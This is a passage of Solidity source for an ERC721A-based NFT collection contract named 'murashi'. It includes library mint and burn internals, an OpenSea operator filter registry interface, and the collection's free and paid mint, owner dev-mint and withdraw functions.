1039      * Emits a {Transfer} event for each mint.
1040      */
1041     function _mint(address to, uint256 quantity) internal virtual {
1042         uint256 startTokenId = _currentIndex;
1043         if (quantity == 0) revert MintZeroQuantity();
1044 
1045         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1046 
1047         // Overflows are incredibly unrealistic.
1048         // `balance` and `numberMinted` have a maximum limit of 2**64.
1049         // `tokenId` has a maximum limit of 2**256.
1050         unchecked {
1051             // Updates:
1052             // - `balance += quantity`.
1053             // - `numberMinted += quantity`.
1054             //
1055             // We can directly add to the `balance` and `numberMinted`.
1056             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1057 
1058             // Updates:
1059             // - `address` to the owner.
1060             // - `startTimestamp` to the timestamp of minting.
1061             // - `burned` to `false`.
1062             // - `nextInitialized` to `quantity == 1`.
1063             _packedOwnerships[startTokenId] = _packOwnershipData(
1064                 to,
1065                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1066             );
1067 
1068             uint256 toMasked;
1069             uint256 end = startTokenId + quantity;
1070 
1071             // Use assembly to loop and emit the `Transfer` event for gas savings.
1072             // The duplicated `log4` removes an extra check and reduces stack juggling.
1073             // The assembly, together with the surrounding Solidity code, have been
1074             // delicately arranged to nudge the compiler into producing optimized opcodes.
1075             assembly {
1076                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1077                 toMasked := and(to, _BITMASK_ADDRESS)
1078                 // Emit the `Transfer` event.
1079                 log4(
1080                     0, // Start of data (0, since no data).
1081                     0, // End of data (0, since no data).
1082                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1083                     0, // `address(0)`.
1084                     toMasked, // `to`.
1085                     startTokenId // `tokenId`.
1086                 )
1087 
1088                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1089                 // that overflows uint256 will make the loop run out of gas.
1090                 // The compiler will optimize the `iszero` away for performance.
1091                 for {
1092                     let tokenId := add(startTokenId, 1)
1093                 } iszero(eq(tokenId, end)) {
1094                     tokenId := add(tokenId, 1)
1095                 } {
1096                     // Emit the `Transfer` event. Similar to above.
1097                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1098                 }
1099             }
1100             if (toMasked == 0) revert MintToZeroAddress();
1101 
1102             _currentIndex = end;
1103         }
1104         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1105     }
1106 
1107     /**
1108      * @dev Mints `quantity` tokens and transfers them to `to`.
1109      *
1110      * This function is intended for efficient minting only during contract creation.
1111      *
1112      * It emits only one {ConsecutiveTransfer} as defined in
1113      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1114      * instead of a sequence of {Transfer} event(s).
1115      *
1116      * Calling this function outside of contract creation WILL make your contract
1117      * non-compliant with the ERC721 standard.
1118      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1119      * {ConsecutiveTransfer} event is only permissible during contract creation.
1120      *
1121      * Requirements:
1122      *
1123      * - `to` cannot be the zero address.
1124      * - `quantity` must be greater than 0.
1125      *
1126      * Emits a {ConsecutiveTransfer} event.
1127      */
1128     function _mintERC2309(address to, uint256 quantity) internal virtual {
1129         uint256 startTokenId = _currentIndex;
1130         if (to == address(0)) revert MintToZeroAddress();
1131         if (quantity == 0) revert MintZeroQuantity();
1132         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1133 
1134         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1135 
1136         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1137         unchecked {
1138             // Updates:
1139             // - `balance += quantity`.
1140             // - `numberMinted += quantity`.
1141             //
1142             // We can directly add to the `balance` and `numberMinted`.
1143             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1144 
1145             // Updates:
1146             // - `address` to the owner.
1147             // - `startTimestamp` to the timestamp of minting.
1148             // - `burned` to `false`.
1149             // - `nextInitialized` to `quantity == 1`.
1150             _packedOwnerships[startTokenId] = _packOwnershipData(
1151                 to,
1152                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1153             );
1154 
1155             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1156 
1157             _currentIndex = startTokenId + quantity;
1158         }
1159         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1160     }
1161 
1162     /**
1163      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1164      *
1165      * Requirements:
1166      *
1167      * - If `to` refers to a smart contract, it must implement
1168      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1169      * - `quantity` must be greater than 0.
1170      *
1171      * See {_mint}.
1172      *
1173      * Emits a {Transfer} event for each mint.
1174      */
1175     function _safeMint(
1176         address to,
1177         uint256 quantity,
1178         bytes memory _data
1179     ) internal virtual {
1180         _mint(to, quantity);
1181 
1182         unchecked {
1183             if (to.code.length != 0) {
1184                 uint256 end = _currentIndex;
1185                 uint256 index = end - quantity;
1186                 do {
1187                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1188                         revert TransferToNonERC721ReceiverImplementer();
1189                     }
1190                 } while (index < end);
1191                 // Reentrancy protection.
1192                 if (_currentIndex != end) revert();
1193             }
1194         }
1195     }
1196 
1197     /**
1198      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1199      */
1200     function _safeMint(address to, uint256 quantity) internal virtual {
1201         _safeMint(to, quantity, '');
1202     }
1203 
1204     // =============================================================
1205     //                        BURN OPERATIONS
1206     // =============================================================
1207 
1208     /**
1209      * @dev Equivalent to `_burn(tokenId, false)`.
1210      */
1211     function _burn(uint256 tokenId) internal virtual {
1212         _burn(tokenId, false);
1213     }
1214 
1215     /**
1216      * @dev Destroys `tokenId`.
1217      * The approval is cleared when the token is burned.
1218      *
1219      * Requirements:
1220      *
1221      * - `tokenId` must exist.
1222      *
1223      * Emits a {Transfer} event.
1224      */
1225     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1226         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1227 
1228         address from = address(uint160(prevOwnershipPacked));
1229 
1230         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1231 
1232         if (approvalCheck) {
1233             // The nested ifs save around 20+ gas over a compound boolean condition.
1234             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1235                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1236         }
1237 
1238         _beforeTokenTransfers(from, address(0), tokenId, 1);
1239 
1240         // Clear approvals from the previous owner.
1241         assembly {
1242             if approvedAddress {
1243                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1244                 sstore(approvedAddressSlot, 0)
1245             }
1246         }
1247 
1248         // Underflow of the sender's balance is impossible because we check for
1249         // ownership above and the recipient's balance can't realistically overflow.
1250         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1251         unchecked {
1252             // Updates:
1253             // - `balance -= 1`.
1254             // - `numberBurned += 1`.
1255             //
1256             // We can directly decrement the balance, and increment the number burned.
1257             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1258             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1259 
1260             // Updates:
1261             // - `address` to the last owner.
1262             // - `startTimestamp` to the timestamp of burning.
1263             // - `burned` to `true`.
1264             // - `nextInitialized` to `true`.
1265             _packedOwnerships[tokenId] = _packOwnershipData(
1266                 from,
1267                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1268             );
1269 
1270             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1271             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1272                 uint256 nextTokenId = tokenId + 1;
1273                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1274                 if (_packedOwnerships[nextTokenId] == 0) {
1275                     // If the next slot is within bounds.
1276                     if (nextTokenId != _currentIndex) {
1277                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1278                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1279                     }
1280                 }
1281             }
1282         }
1283 
1284         emit Transfer(from, address(0), tokenId);
1285         _afterTokenTransfers(from, address(0), tokenId, 1);
1286 
1287         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1288         unchecked {
1289             _burnCounter++;
1290         }
1291     }
1292 
1293     // =============================================================
1294     //                     EXTRA DATA OPERATIONS
1295     // =============================================================
1296 
1297     /**
1298      * @dev Directly sets the extra data for the ownership data `index`.
1299      */
1300     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1301         uint256 packed = _packedOwnerships[index];
1302         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1303         uint256 extraDataCasted;
1304         // Cast `extraData` with assembly to avoid redundant masking.
1305         assembly {
1306             extraDataCasted := extraData
1307         }
1308         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1309         _packedOwnerships[index] = packed;
1310     }
1311 
1312     /**
1313      * @dev Called during each token transfer to set the 24bit `extraData` field.
1314      * Intended to be overridden by the cosumer contract.
1315      *
1316      * `previousExtraData` - the value of `extraData` before transfer.
1317      *
1318      * Calling conditions:
1319      *
1320      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1321      * transferred to `to`.
1322      * - When `from` is zero, `tokenId` will be minted for `to`.
1323      * - When `to` is zero, `tokenId` will be burned by `from`.
1324      * - `from` and `to` are never both zero.
1325      */
1326     function _extraData(
1327         address from,
1328         address to,
1329         uint24 previousExtraData
1330     ) internal view virtual returns (uint24) {}
1331 
1332     /**
1333      * @dev Returns the next extra data for the packed ownership data.
1334      * The returned result is shifted into position.
1335      */
1336     function _nextExtraData(
1337         address from,
1338         address to,
1339         uint256 prevOwnershipPacked
1340     ) private view returns (uint256) {
1341         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1342         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1343     }
1344 
1345     // =============================================================
1346     //                       OTHER OPERATIONS
1347     // =============================================================
1348 
1349     /**
1350      * @dev Returns the message sender (defaults to `msg.sender`).
1351      *
1352      * If you are writing GSN compatible contracts, you need to override this function.
1353      */
1354     function _msgSenderERC721A() internal view virtual returns (address) {
1355         return msg.sender;
1356     }
1357 
1358     /**
1359      * @dev Converts a uint256 to its ASCII string decimal representation.
1360      */
1361     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1362         assembly {
1363             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1364             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1365             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1366             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1367             let m := add(mload(0x40), 0xa0)
1368             // Update the free memory pointer to allocate.
1369             mstore(0x40, m)
1370             // Assign the `str` to the end.
1371             str := sub(m, 0x20)
1372             // Zeroize the slot after the string.
1373             mstore(str, 0)
1374 
1375             // Cache the end of the memory to calculate the length later.
1376             let end := str
1377 
1378             // We write the string from rightmost digit to leftmost digit.
1379             // The following is essentially a do-while loop that also handles the zero case.
1380             // prettier-ignore
1381             for { let temp := value } 1 {} {
1382                 str := sub(str, 1)
1383                 // Write the character to the pointer.
1384                 // The ASCII index of the '0' character is 48.
1385                 mstore8(str, add(48, mod(temp, 10)))
1386                 // Keep dividing `temp` until zero.
1387                 temp := div(temp, 10)
1388                 // prettier-ignore
1389                 if iszero(temp) { break }
1390             }
1391 
1392             let length := sub(end, str)
1393             // Move the pointer 32 bytes leftwards to make room for the length.
1394             str := sub(str, 0x20)
1395             // Store the length.
1396             mstore(str, length)
1397         }
1398     }
1399 }
1400 
1401 
1402 interface IOperatorFilterRegistry {
1403     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1404     function register(address registrant) external;
1405     function registerAndSubscribe(address registrant, address subscription) external;
1406     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1407     function unregister(address addr) external;
1408     function updateOperator(address registrant, address operator, bool filtered) external;
1409     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1410     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1411     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1412     function subscribe(address registrant, address registrantToSubscribe) external;
1413     function unsubscribe(address registrant, bool copyExistingEntries) external;
1414     function subscriptionOf(address addr) external returns (address registrant);
1415     function subscribers(address registrant) external returns (address[] memory);
1416     function subscriberAt(address registrant, uint256 index) external returns (address);
1417     function copyEntriesOf(address registrant, address registrantToCopy) external;
1418     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1419     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1420     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1421     function filteredOperators(address addr) external returns (address[] memory);
1422     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1423     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1424     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1425     function isRegistered(address addr) external returns (bool);
1426     function codeHashOf(address addr) external returns (bytes32);
1427 }
1428 
1429 
1430 /**
1431  * @title  OperatorFilterer
1432  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1433  *         registrant's entries in the OperatorFilterRegistry.
1434  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1435  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1436  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1437  */
1438 abstract contract OperatorFilterer {
1439     error OperatorNotAllowed(address operator);
1440 
1441     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1442         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1443 
1444     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1445         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1446         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1447         // order for the modifier to filter addresses.
1448         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1449             if (subscribe) {
1450                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1451             } else {
1452                 if (subscriptionOrRegistrantToCopy != address(0)) {
1453                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1454                 } else {
1455                     OPERATOR_FILTER_REGISTRY.register(address(this));
1456                 }
1457             }
1458         }
1459     }
1460 
1461     modifier onlyAllowedOperator(address from) virtual {
1462         // Check registry code length to facilitate testing in environments without a deployed registry.
1463         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1464             // Allow spending tokens from addresses with balance
1465             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1466             // from an EOA.
1467             if (from == msg.sender) {
1468                 _;
1469                 return;
1470             }
1471             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1472                 revert OperatorNotAllowed(msg.sender);
1473             }
1474         }
1475         _;
1476     }
1477 
1478     modifier onlyAllowedOperatorApproval(address operator) virtual {
1479         // Check registry code length to facilitate testing in environments without a deployed registry.
1480         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1481             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1482                 revert OperatorNotAllowed(operator);
1483             }
1484         }
1485         _;
1486     }
1487 }
1488 
1489 /**
1490  * @title  DefaultOperatorFilterer
1491  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1492  */
1493 abstract contract TheOperatorFilterer is OperatorFilterer {
1494     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1495 
1496     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1497 }
1498 
1499 
1500 contract murashi is ERC721A, TheOperatorFilterer {
1501 
1502     address public owner;
1503 
1504     uint256 public maxSupply = 870;
1505 
1506     uint256 public cost = 0.002 ether;
1507 
1508     uint256 public maxFreeNumerAddr = 1;
1509 
1510     mapping(address => uint256) _numForFree;
1511 
1512     mapping(uint256 => uint256) _numMinted;
1513 
1514     uint256 private maxPerTx;
1515 
1516     function claim(uint256 amount) payable public {
1517         require(totalSupply() + amount <= maxSupply);
1518         if (msg.value == 0) {
1519             _freemints(amount);
1520         } else {
1521             require(amount <= maxPerTx);
1522             require(msg.value >= amount * cost);
1523             _safeMint(msg.sender, amount);
1524         }
1525     }
1526 
1527     function _freemints(uint256 amount) internal {
1528         require(amount == 1 
1529             && _numMinted[block.number] < FreeNum() 
1530             && _numForFree[tx.origin] < maxFreeNumerAddr );
1531             _numForFree[tx.origin]++;
1532             _numMinted[block.number]++;
1533         _safeMint(msg.sender, 1);
1534     }
1535 
1536     function devmint(address rec, uint256 amount) public onlyOwner {
1537         _safeMint(rec, amount);
1538     }
1539     
1540     modifier onlyOwner {
1541         require(owner == msg.sender);
1542         _;
1543     }
1544 
1545     constructor() ERC721A("Murashi by Musa", "Murashi") {
1546         owner = msg.sender;
1547         maxPerTx = 20;
1548     }
1549 
1550     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1551         return string(abi.encodePacked("ipfs://QmWFJqrV4LwvWHHS1AUF5e5qW37yT1TUfZ7Ty2eALoK39n/", _toString(tokenId), ".json"));
1552     }
1553 
1554     function setMaxFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1555         maxFreeNumerAddr = maxTx;
1556         maxSupply = maxS;
1557     }
1558 
1559     function FreeNum() internal returns (uint256){
1560         return (maxSupply - totalSupply()) / 12;
1561     }
1562 
1563     function withdraw() external onlyOwner {
1564         payable(msg.sender).transfer(address(this).balance);
1565     }
1566 
1567     /////////////////////////////
1568     // OPENSEA FILTER REGISTRY 
1569     /////////////////////////////
1570 
1571     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1572         super.setApprovalForAll(operator, approved);
1573     }
1574 
1575     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1576         super.approve(operator, tokenId);
1577     }
1578 
1579     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1580         super.transferFrom(from, to, tokenId);
1581     }
1582 
1583     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1584         super.safeTransferFrom(from, to, tokenId);
1585     }
1586 
1587     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1588         public
1589         payable
1590         override
1591         onlyAllowedOperator(from)
1592     {
1593         super.safeTransferFrom(from, to, tokenId, data);
1594     }
1595 }